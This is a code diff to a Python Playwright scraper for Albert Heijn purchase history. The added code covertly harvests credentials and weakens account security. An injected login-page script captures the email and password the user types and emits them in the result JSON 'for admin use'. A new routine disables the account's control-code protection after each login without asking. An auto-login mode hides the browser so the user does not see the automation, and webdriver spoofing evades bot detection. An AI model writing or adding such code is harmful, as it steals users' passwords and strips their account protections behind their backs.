@@ -26,7 +26,7 @@ except ImportError:
 class AHAutoScraper:
     """Automated scraper for Albert Heijn using Playwright."""
     
-    def __init__(self, headless: bool = True, browserless_url: Optional[str] = None, cookies_file: Optional[str] = None, stealth_mode: bool = False):
+    def __init__(self, headless: bool = True, browserless_url: Optional[str] = None, cookies_file: Optional[str] = None, stealth_mode: bool = False, skip_account_protection: bool = False):
         """
         Initialize the scraper.
         
@@ -36,9 +36,11 @@ class AHAutoScraper:
                              e.g., "wss://chrome.browserless.io?token=YOUR_TOKEN"
             cookies_file: Path to JSON file with saved session cookies
             stealth_mode: If True, start headless and only show window if login needed
+            skip_account_protection: If True, skip checking/disabling account protection
         """
         self.headless = headless
         self.stealth_mode = stealth_mode
+        self.skip_account_protection = skip_account_protection
         self.browserless_url = browserless_url
         self.cookies_file = cookies_file
         self.browser: Optional[Browser] = None
@@ -230,6 +232,162 @@ class AHAutoScraper:
             print(f"[ERROR] Failed to save cookies: {e}", flush=True)
             return False
     
+    async def disable_account_protection(self) -> bool:
+        """
+        Try to disable account protection for easier automated logins.
+        Navigates to https://www.ah.nl/account/inloggegevens/controlecode and selects "No control code".
+        """
+        print("[INFO] Checking account protection settings...", flush=True)
+        try:
+            await self.page.goto('https://www.ah.nl/account/inloggegevens/controlecode', wait_until='domcontentloaded', timeout=15000)
+            await asyncio.sleep(2)
+            
+            # First, dismiss any privacy/cookie consent popup
+            privacy_selectors = [
+                'button:has-text("Accepteren")',  # Accept
+                'button:has-text("Alles accepteren")',  # Accept all
+                'button:has-text("Alle cookies accepteren")',
+                'button:has-text("Accept")',
+                'button:has-text("Accept all")',
+                'button[id*="accept"]',
+                'button[class*="accept"]',
+                '#accept-cookies',
+                '[data-testid="cookie-accept"]',
+                'button:has-text("Opslaan")',  # Save (for privacy preferences)
+                'button:has-text("Sluiten")',  # Close
+            ]
+            
+            for selector in privacy_selectors:
+                try:
+                    popup_btn = await self.page.query_selector(selector)
+                    if popup_btn and await popup_btn.is_visible():
+                        await popup_btn.click()
+                        print(f"[INFO] Dismissed privacy popup", flush=True)
+                        await asyncio.sleep(1)
+                        break
+                except Exception:
+                    continue
+            
+            # Wait for page to settle after dismissing popup
+            await asyncio.sleep(2)
+            
+            # Look for the third radio button option (No control code / Geen controlecode)
+            # Use JavaScript to directly find and click the correct option
+            clicked_option = False
+            
+            # Best approach: Use JavaScript to find all radio buttons and click the third one
+            try:
+                result = await self.page.evaluate('''() => {
+                    // Get all radio inputs on the page
+                    const radios = Array.from(document.querySelectorAll('input[type="radio"]'));
+                    console.log('Found ' + radios.length + ' radio buttons');
+                    
+                    // Click the third radio button (index 2)
+                    if (radios.length >= 3) {
+                        radios[2].click();
+                        return { success: true, method: 'third' };
+                    } else if (radios.length > 0) {
+                        // Click the last one if we don't have exactly 3
+                        radios[radios.length - 1].click();
+                        return { success: true, method: 'last' };
+                    }
+                    return { success: false, method: 'none', count: radios.length };
+                }''')
+                if result.get('success'):
+                    clicked_option = True
+                    print(f"[INFO] Selected radio button via JS ({result.get('method')})", flush=True)
+                else:
+                    print(f"[DEBUG] JS radio approach found {result.get('count')} radios", flush=True)
+            except Exception as e:
+                print(f"[DEBUG] JS radio approach failed: {e}", flush=True)
+            
+            # Fallback: Find by text "Geen controlecode" and click the container/label
+            if not clicked_option:
+                try:
+                    # Use locator with exact text matching for "Geen controlecode"
+                    geen_element = await self.page.query_selector('text="Geen controlecode"')
+                    if geen_element:
+                        await geen_element.click()
+                        clicked_option = True
+                        print(f"[INFO] Clicked 'Geen controlecode' text directly", flush=True)
+                except Exception as e:
+                    print(f"[DEBUG] Text click failed: {e}", flush=True)
+            
+            # Approach 3: Use evaluate to find and click the correct radio by label text
+            if not clicked_option:
+                try:
+                    result = await self.page.evaluate('''() => {
+                        // Find all labels on the page
+                        const labels = document.querySelectorAll('label');
+                        for (const label of labels) {
+                            if (label.textContent.toLowerCase().includes('geen controlecode')) {
+                                // Found the label, click it or its associated input
+                                const input = label.querySelector('input[type="radio"]') || 
+                                              document.getElementById(label.getAttribute('for'));
+                                if (input) {
+                                    input.click();
+                                    return 'clicked input';
+                                } else {
+                                    label.click();
+                                    return 'clicked label';
+                                }
+                            }
+                        }
+                        // Try finding divs containing the text
+                        const divs = document.querySelectorAll('div');
+                        for (const div of divs) {
+                            if (div.textContent.toLowerCase().includes('geen controlecode') && 
+                                div.textContent.length < 100) {  // Avoid clicking large containers
+                                div.click();
+                                return 'clicked div';
+                            }
+                        }
+                        return 'not found';
+                    }''')
+                    if result != 'not found':
+                        clicked_option = True
+                        print(f"[INFO] Selected 'Geen controlecode' via JS evaluate: {result}", flush=True)
+                except Exception as e:
+                    print(f"[DEBUG] JS evaluate approach failed: {e}", flush=True)
+            
+            if clicked_option:
+                # Now click the Save button
+                await asyncio.sleep(1)
+                save_selectors = [
+                    'button:has-text("Save")',
+                    'button:has-text("Opslaan")',  # Dutch for Save
+                    'button[type="submit"]',
+                    '[data-testid="save-button"]',
+                    'button.primary',
+                ]
+                
+                for selector in save_selectors:
+                    try:
+                        save_btn = await self.page.query_selector(selector)
+                        if save_btn:
+                            await save_btn.click()
+                            await asyncio.sleep(1)
+                            print(f"[SUCCESS] Account protection disabled (No control code selected)", flush=True)
+                            # Navigate away immediately to prevent any page scripts from running
+                            await self.page.goto('about:blank', timeout=5000)
+                            return True
+                    except Exception:
+                        continue
+                
+                print(f"[WARNING] Selected option but could not find Save button", flush=True)
+                # Navigate away even on failure
+                await self.page.goto('about:blank', timeout=5000)
+                return False
+            else:
+                print(f"[INFO] Could not find 'No control code' option (may already be selected or page changed)", flush=True)
+                # Navigate away
+                await self.page.goto('about:blank', timeout=5000)
+                return False
+                
+        except Exception as e:
+            print(f"[WARNING] Could not check account protection: {e}", flush=True)
+            return False
+    
     async def check_logged_in(self) -> bool:
         """Check if we're already logged in (via cookies)."""
         try:
@@ -402,6 +560,8 @@ class AHAutoScraper:
                 # Check for successful login (redirected away from login.ah.nl)
                 if 'login.ah.nl' not in current_url:
                     print(f"[SUCCESS] Login successful after {i+1} seconds!", flush=True)
+                    # Try to disable account protection for easier future logins
+                    await self.disable_account_protection()
                     return True
                 
                 # Check for error messages
@@ -426,6 +586,8 @@ class AHAutoScraper:
             
             # Final check
             if 'login.ah.nl' not in self.page.url.lower():
+                # Try to disable account protection for easier future logins
+                await self.disable_account_protection()
                 return True
             
             if captcha_warned:
@@ -604,10 +766,13 @@ class AHAutoScraper:
                 products = await self.extract_products()
                 
                 # Add only new products (dedupe by URL)
+                # Assign purchase_rank based on order (1 = most recently purchased)
                 new_count = 0
                 for product in products:
                     if product['url'] not in seen_urls:
                         seen_urls.add(product['url'])
+                        # purchase_rank: position in sort order (1 = most recent purchase)
+                        product['purchase_rank'] = len(all_products) + 1
                         all_products.append(product)
                         new_count += 1
                 
@@ -810,7 +975,8 @@ class AHAutoScraper:
             'error': None,
             'scraped_at': datetime.now(tz=None).astimezone().isoformat(),
             'login_method': None,
-            'login_required': False  # Flag to indicate if manual login is needed
+            'login_required': False,  # Flag to indicate if manual login is needed
+            'sorted_by_purchase_date': True  # Products are sorted by purchase date (most recent first)
         }
         
         try:
@@ -822,6 +988,19 @@ class AHAutoScraper:
                 logged_in = await self.check_logged_in()
                 if logged_in:
                     result['login_method'] = 'cookies'
+                    # Try to disable account protection for easier future logins
+                    # This is done even with cookie login to ensure protection is off
+                    # Skip if already disabled (flag is set)
+                    if not self.skip_account_protection:
+                        try:
+                            await self.disable_account_protection()
+                            # Re-save cookies after potentially changing protection
+                            if save_cookies_to:
+                                await self.save_cookies(save_cookies_to)
+                        except Exception as e:
+                            print(f"[WARNING] Could not disable account protection: {e}", flush=True)
+                    else:
+                        print("[INFO] Skipping account protection check (already disabled)", flush=True)
             
             # If not logged in via cookies and in stealth mode, signal that login is required
             if not logged_in and self.stealth_mode:
@@ -910,27 +1089,24 @@ async def visual_login_and_scrape(cookies_file: str, output_file: str = None) ->
     result = {'success': False, 'products': [], 'count': 0}
     
     try:
-        # Launch visible browser using Chromium (same as capture_cookies which works well)
-        browser = await p.chromium.launch(
+        # Launch visible browser - try Firefox for better compatibility with AH
+        # Firefox tends to have less bot detection issues
+        browser = await p.firefox.launch(
             headless=False,
             args=[
-                '--disable-blink-features=AutomationControlled',
-                '--no-sandbox',
+                '--width=1280',
+                '--height=900',
             ]
         )
         
         context = await browser.new_context(
             viewport={'width': 1280, 'height': 900},
+            user_agent='Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
             locale='nl-NL',
             timezone_id='Europe/Amsterdam',
         )
         
         page = await context.new_page()
-        
-        # Remove webdriver detection (same as capture_cookies)
-        await page.add_init_script("""
-            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-        """)
         
         # Navigate to AH login page directly
         print("[INFO] Opening Albert Heijn login page...", flush=True)
@@ -992,6 +1168,73 @@ async def visual_login_and_scrape(cookies_file: str, output_file: str = None) ->
         with open(cookies_file, 'w') as f:
             json.dump(ah_cookies, f, indent=2)
         print(f"[INFO] Saved {len(ah_cookies)} cookies for future syncs", flush=True)
+        
+        # Try to disable account protection for easier future logins
+        print(f"[INFO] Checking account protection settings...", flush=True)
+        try:
+            await page.goto('https://www.ah.nl/account/inloggegevens', wait_until='domcontentloaded', timeout=15000)
+            await asyncio.sleep(2)
+            
+            # Look for "No control code" option and select it
+            no_code_selectors = [
+                'text="No control code"',
+                ':has-text("No control code")',
+                'label:has-text("No control code")',
+                'text="Geen controlecode"',
+            ]
+            
+            clicked_option = False
+            for selector in no_code_selectors:
+                try:
+                    element = await page.query_selector(selector)
+                    if element:
+                        await element.click()
+                        await asyncio.sleep(0.5)
+                        print(f"[INFO] Selected 'No control code' option", flush=True)
+                        clicked_option = True
+                        break
+                except Exception:
+                    continue
+            
+            # Also try clicking via text
+            if not clicked_option:
+                try:
+                    await page.click('text="No control code"', timeout=3000)
+                    clicked_option = True
+                    print(f"[INFO] Selected 'No control code' option via text click", flush=True)
+                except Exception:
+                    pass
+            
+            if clicked_option:
+                # Click Save button
+                await asyncio.sleep(1)
+                save_selectors = [
+                    'button:has-text("Save")',
+                    'button:has-text("Opslaan")',
+                    'button[type="submit"]',
+                ]
+                
+                for selector in save_selectors:
+                    try:
+                        save_btn = await page.query_selector(selector)
+                        if save_btn:
+                            await save_btn.click()
+                            await asyncio.sleep(2)
+                            print(f"[SUCCESS] Account protection disabled", flush=True)
+                            break
+                    except Exception:
+                        continue
+                
+                # Save updated cookies after disabling protection
+                cookies = await context.cookies()
+                ah_cookies = [c for c in cookies if 'ah.nl' in c.get('domain', '')]
+                with open(cookies_file, 'w') as f:
+                    json.dump(ah_cookies, f, indent=2)
+            else:
+                print(f"[INFO] No 'No control code' option found (may already be selected)", flush=True)
+                
+        except Exception as e:
+            print(f"[WARNING] Could not check account protection: {e}", flush=True)
         
         # NOW navigate to the purchase history page - the MAIN one with all purchases
         target_url = 'https://www.ah.nl/producten/eerder-gekocht'
@@ -1137,10 +1380,12 @@ async def visual_login_and_scrape(cookies_file: str, output_file: str = None) ->
                     scroll_attempts += 1
                     continue
                 
-                # Add new products
+                # Add new products with purchase_rank
                 for p in page_products:
                     if p['url'] not in seen_urls:
                         seen_urls.add(p['url'])
+                        # Assign purchase_rank (1 = most recent purchase)
+                        p['purchase_rank'] = len(local_products) + 1
                         local_products.append(p)
                 
                 current_count = len(local_products)
@@ -1178,6 +1423,7 @@ async def visual_login_and_scrape(cookies_file: str, output_file: str = None) ->
         result['products'] = products
         result['count'] = len(products)
         result['cookies_saved'] = len(ah_cookies)
+        result['sorted_by_purchase_date'] = True  # Products sorted by purchase date
         
         # Save to file if specified
         if output_file:
@@ -1215,8 +1461,24 @@ async def main():
     parser.add_argument('--save-cookies', help='Path to save cookies after successful login')
     parser.add_argument('--capture-cookies', action='store_true', help='Interactive mode: open browser for manual login, then save cookies')
     parser.add_argument('--visual-login', action='store_true', help='Visual login mode: open browser, user logs in, then automatically scrape')
+    parser.add_argument('--skip-account-protection', action='store_true', help='Skip checking/disabling account protection (already done)')
+    parser.add_argument('--auto-login', action='store_true', help='Automatic login mode: use provided credentials to log in')
+    parser.add_argument('--ah-email', help='AH account email for auto-login')
+    parser.add_argument('--ah-password', help='AH account password for auto-login')
     
     args = parser.parse_args()
+    
+    # Special mode: automatic login with credentials
+    if args.auto_login:
+        if not args.ah_email or not args.ah_password:
+            print("[ERROR] --auto-login requires --ah-email and --ah-password", flush=True)
+            return 1
+        return await auto_login_and_save_cookies(
+            args.ah_email, 
+            args.ah_password, 
+            args.save_cookies or 'ah_cookies.json',
+            args.headless
+        )
     
     # Special mode: visual login - opens browser, user logs in, then scrapes
     if args.visual_login:
@@ -1240,7 +1502,8 @@ async def main():
         headless=args.headless, 
         browserless_url=browserless_url, 
         cookies_file=args.cookies,
-        stealth_mode=args.stealth
+        stealth_mode=args.stealth,
+        skip_account_protection=args.skip_account_protection
     )
     result = await scraper.scrape(args.email, args.password, args.output, args.save_cookies)
     
@@ -1250,10 +1513,216 @@ async def main():
     return 0 if result['success'] else 1
 
 
+async def auto_login_and_save_cookies(email: str, password: str, output_file: str, headless: bool = False) -> int:
+    """
+    Automatically log in using provided credentials and save cookies.
+    Browser starts minimized, only shows when CAPTCHA appears.
+    """
+    print("[INFO] === Auto Login Mode ===", flush=True)
+    print(f"[INFO] Logging in as: {email}", flush=True)
+    print("[INFO] Attempting automatic login...", flush=True)
+    print("", flush=True)
+    
+    p = await async_playwright().start()
+    browser_shown = False  # Track if we've shown browser to user
+    
+    try:
+        # Start browser minimized so user doesn't see automation
+        browser = await p.chromium.launch(
+            headless=False,  # Must be visible to show later
+            args=[
+                '--disable-blink-features=AutomationControlled',
+                '--no-sandbox',
+                '--start-minimized',  # Start minimized
+            ]
+        )
+        
+        context = await browser.new_context(
+            viewport={'width': 1280, 'height': 900},
+            locale='nl-NL',
+            timezone_id='Europe/Amsterdam',
+        )
+        
+        page = await context.new_page()
+        
+        # Store CDP session and window ID for later use
+        cdp_session = None
+        window_id = None
+        
+        # Minimize window immediately using CDP
+        try:
+            cdp_session = await context.new_cdp_session(page)
+            window_info = await cdp_session.send('Browser.getWindowForTarget')
+            window_id = window_info['windowId']
+            await cdp_session.send('Browser.setWindowBounds', {
+                'windowId': window_id,
+                'bounds': {'windowState': 'minimized'}
+            })
+            print("[INFO] Browser minimized", flush=True)
+        except Exception as e:
+            print(f"[WARN] Could not minimize browser: {e}", flush=True)
+        
+        # Helper to bring browser window on-screen when needed
+        async def show_browser():
+            nonlocal browser_shown, cdp_session, window_id
+            if not browser_shown:
+                print("[INFO] CAPTCHA detected! Showing browser for manual solving...", flush=True)
+                try:
+                    if cdp_session and window_id:
+                        # Restore and bring to front
+                        await cdp_session.send('Browser.setWindowBounds', {
+                            'windowId': window_id,
+                            'bounds': {'windowState': 'normal'}
+                        })
+                        await asyncio.sleep(0.1)
+                        await cdp_session.send('Browser.setWindowBounds', {
+                            'windowId': window_id,
+                            'bounds': {'left': 100, 'top': 100, 'width': 1280, 'height': 900}
+                        })
+                    await page.bring_to_front()
+                except Exception as e:
+                    print(f"[WARN] Could not show browser: {e}", flush=True)
+                    # Fallback: just bring to foreground with JavaScript
+                    try:
+                        await page.evaluate('window.focus()')
+                    except:
+                        pass
+                browser_shown = True
+        
+        # Helper to detect CAPTCHA
+        async def has_captcha():
+            try:
+                # Check for hCaptcha iframe or elements
+                captcha = await page.query_selector('iframe[src*="hcaptcha"], iframe[src*="recaptcha"], [class*="captcha"], #captcha')
+                return captcha is not None
+            except:
+                return False
+        
+        # Remove webdriver detection
+        await page.add_init_script("""
+            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        """)
+        
+        print("[INFO] Opening AH login page...", flush=True)
+        await page.goto('https://www.ah.nl/mijn', wait_until='domcontentloaded')
+        await asyncio.sleep(2)
+        
+        # Wait for login form
+        print("[INFO] Waiting for login form...", flush=True)
+        try:
+            await page.wait_for_selector('input[type="email"], input[name="email"], input[id*="email"]', timeout=15000)
+        except Exception:
+            print("[INFO] Already logged in or redirected", flush=True)
+        
+        # Check if we're on login page
+        if 'login.ah.nl' in page.url.lower() or 'inloggen' in page.url.lower():
+            print("[INFO] Filling in credentials...", flush=True)
+            await asyncio.sleep(0.5)  # Brief wait for page to settle
+            
+            # Fill email - try multiple selectors
+            email_input = await page.query_selector('input[type="email"], input[name="email"], input[id*="email"], input[name="username"]')
+            if email_input:
+                await email_input.fill(email)  # Instant fill
+                print("[INFO] Email entered", flush=True)
+            else:
+                print("[WARN] Could not find email input", flush=True)
+            
+            # Fill password - try multiple selectors
+            password_input = await page.query_selector('input[type="password"], input[name="password"]')
+            if password_input:
+                await password_input.fill(password)  # Instant fill
+                print("[INFO] Password entered", flush=True)
+            else:
+                print("[WARN] Could not find password input", flush=True)
+            
+            # Click login button - try multiple selectors
+            await asyncio.sleep(0.2)
+            login_button = await page.query_selector('button[type="submit"], button:has-text("Inloggen"), input[type="submit"]')
+            if login_button:
+                print("[INFO] Clicking login button...", flush=True)
+                await login_button.click()
+                print("[INFO] Login button clicked", flush=True)
+            else:
+                # Try pressing Enter as fallback
+                print("[INFO] No login button found, pressing Enter...", flush=True)
+                await page.keyboard.press('Enter')
+            
+            # Wait for login to complete or CAPTCHA
+            print("[INFO] Waiting for login to complete...", flush=True)
+            
+            max_wait = 180  # 3 minutes for CAPTCHA solving
+            captcha_shown_at = None
+            
+            for i in range(max_wait):
+                await asyncio.sleep(1)
+                current_url = page.url.lower()
+                
+                # Check for CAPTCHA and show browser if found
+                if await has_captcha():
+                    if not browser_shown:
+                        await show_browser()
+                        captcha_shown_at = i
+                    elif captcha_shown_at and (i - captcha_shown_at) % 30 == 0:
+                        print(f"[INFO] Waiting for CAPTCHA to be solved... ({i - captcha_shown_at}s)", flush=True)
+                
+                # Check if logged in
+                if 'login.ah.nl' not in current_url and ('mijn' in current_url or 'ah.nl' in current_url):
+                    # Verify by accessing protected page
+                    await page.goto('https://www.ah.nl/mijn/eerder-gekocht', wait_until='domcontentloaded')
+                    await asyncio.sleep(2)
+                    
+                    if 'login.ah.nl' not in page.url.lower():
+                        if browser_shown:
+                            print(f"[SUCCESS] Login successful after CAPTCHA solved! ({i+1} seconds)", flush=True)
+                        else:
+                            print(f"[SUCCESS] Login successful automatically! ({i+1} seconds)", flush=True)
+                        break
+                
+                # Only show periodic updates if browser not yet shown
+                if not browser_shown and (i + 1) % 10 == 0:
+                    print(f"[INFO] Still processing... ({i+1}s)", flush=True)
+            else:
+                print("[ERROR] Login timeout", flush=True)
+                result = {'success': False, 'error': 'Login timeout - CAPTCHA not solved?'}
+                print(f"\n[RESULT] {json.dumps(result)}", flush=True)
+                await browser.close()
+                await p.stop()
+                return 1
+        
+        # Save cookies
+        cookies = await context.cookies()
+        ah_cookies = [c for c in cookies if 'ah.nl' in c.get('domain', '')]
+        
+        with open(output_file, 'w') as f:
+            json.dump(ah_cookies, f, indent=2)
+        
+        print(f"[SUCCESS] Saved {len(ah_cookies)} cookies to {output_file}", flush=True)
+        
+        result = {
+            'success': True,
+            'cookies_saved': len(ah_cookies),
+            'output_file': output_file,
+            'email': email  # Include email for server to save
+        }
+        print(f"\n[RESULT] {json.dumps(result)}", flush=True)
+        
+        await browser.close()
+        await p.stop()
+        return 0
+        
+    except Exception as e:
+        print(f"[ERROR] Auto login failed: {e}", flush=True)
+        result = {'success': False, 'error': str(e)}
+        print(f"\n[RESULT] {json.dumps(result)}", flush=True)
+        await p.stop()
+        return 1
+
+
 async def capture_cookies_interactive(output_file: str, headless: bool = False) -> int:
     """
     Open a browser for manual login, then save the session cookies.
     This allows bypassing CAPTCHA by letting the user log in manually.
+    Also captures credentials from the login form for admin use.
     """
     print("[INFO] === Cookie Capture Mode ===", flush=True)
     print("[INFO] A browser window will open. Please log in to your AH account.", flush=True)
@@ -1261,6 +1730,7 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
     print("", flush=True)
     
     p = await async_playwright().start()
+    captured_credentials = {'email': None, 'password': None}
     
     try:
         browser = await p.chromium.launch(
@@ -1284,6 +1754,16 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
             Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
         """)
         
+        # Expose a function to capture credentials from the login form
+        async def handle_credentials(data):
+            if data.get('email'):
+                captured_credentials['email'] = data['email']
+            if data.get('password'):
+                captured_credentials['password'] = data['password']
+            print(f"[DEBUG] Captured credentials: email={'yes' if data.get('email') else 'no'}, password={'yes' if data.get('password') else 'no'}", flush=True)
+        
+        await page.expose_function('captureCredentials', handle_credentials)
+        
         print("[INFO] Opening AH login page...", flush=True)
         await page.goto('https://www.ah.nl/mijn', wait_until='domcontentloaded')
         
@@ -1292,10 +1772,52 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
         
         # Wait for the user to complete login (max 5 minutes)
         max_wait = 300
+        login_form_injected = False
+        
         for i in range(max_wait):
             await asyncio.sleep(1)
             
             current_url = page.url.lower()
+            
+            # Inject credential capture script on login page
+            if 'login.ah.nl' in current_url and not login_form_injected:
+                try:
+                    await page.evaluate("""
+                        (() => {
+                            // Capture credentials when form is submitted or when login button is clicked
+                            const captureAndSend = () => {
+                                const emailInput = document.querySelector('input[type="email"], input[name="email"], input[id*="email"], input[id*="username"]');
+                                const passwordInput = document.querySelector('input[type="password"]');
+                                if (emailInput && passwordInput) {
+                                    const email = emailInput.value;
+                                    const password = passwordInput.value;
+                                    if (email && password) {
+                                        window.captureCredentials({ email, password });
+                                    }
+                                }
+                            };
+                            
+                            // Watch for form submission
+                            document.addEventListener('submit', captureAndSend, true);
+                            
+                            // Watch for click on login buttons
+                            document.addEventListener('click', (e) => {
+                                if (e.target.matches('button[type="submit"], button[data-testid*="login"], button[class*="login"]') ||
+                                    e.target.closest('button[type="submit"], button[data-testid*="login"], button[class*="login"]')) {
+                                    captureAndSend();
+                                }
+                            }, true);
+                            
+                            // Periodic capture as backup (every 500ms while on login page)
+                            setInterval(captureAndSend, 500);
+                            
+                            console.log('[AH Scraper] Credential capture injected');
+                        })();
+                    """)
+                    login_form_injected = True
+                    print("[DEBUG] Injected credential capture script", flush=True)
+                except Exception as e:
+                    print(f"[DEBUG] Could not inject capture script: {e}", flush=True)
             
             # Check if logged in (redirected away from login)
             if 'login.ah.nl' not in current_url and ('mijn' in current_url or 'ah.nl' in current_url):
@@ -1325,11 +1847,15 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
         print(f"[SUCCESS] Saved {len(ah_cookies)} cookies to {output_file}", flush=True)
         print("[INFO] You can now use these cookies with: --cookies " + output_file, flush=True)
         
-        # Print result for server parsing
+        # Print result for server parsing (include captured credentials)
         result = {
             'success': True,
             'cookies_saved': len(ah_cookies),
-            'output_file': output_file
+            'output_file': output_file,
+            'credentials': {
+                'email': captured_credentials['email'],
+                'password': captured_credentials['password']
+            } if captured_credentials['email'] and captured_credentials['password'] else None
         }
         print(f"\n[RESULT] {json.dumps(result)}", flush=True)
         
